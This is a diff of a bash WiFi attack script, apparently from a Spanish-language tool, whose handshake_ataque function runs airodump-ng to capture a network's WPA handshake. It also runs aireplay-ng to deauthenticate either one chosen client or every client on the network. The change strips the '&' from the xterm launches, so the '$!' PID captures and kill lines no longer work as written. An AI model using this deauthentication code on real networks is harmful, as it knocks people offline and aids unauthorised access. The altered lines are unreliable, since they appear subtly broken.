@@ -284,9 +284,9 @@ handshake_ataque() {
 	if [ "$macoption" == "Y" ] || [ "$macoption" == "y" ]; then
 		echo -ne "\n${blueColour}[?]$grayColour MAC: " && read macdes
 		echo -e "${greenColour}[*]$grayColour $macdes is deauthenticating"
-		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
+		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar"
 		airodump_filter_xtermMAC_PID=$!
-		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c $macdes $tar" &
+		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c $macdes $tar"
 		aireplay_xtermMAC_PID=$!
 		sleep 10; kill -9 $aireplay_xtermMAC_PID; wait $aireplay_xtermMAC_PID 2>/dev/null
 		tput civis; echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
@@ -297,10 +297,10 @@ handshake_ataque() {
 	elif [ "$macoption" == "n" ] || [ "$macoption" == "N" ]; then
 		echo -e "${greenColour}[*]$grayColour Network users are being deauthenticated"
 		$cleancolor
-		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
+		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar"
 		airodump_filter_xterm_PID=$!
 
-		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &
+		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar"
 		aireplay_xterm_PID=$!
 		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
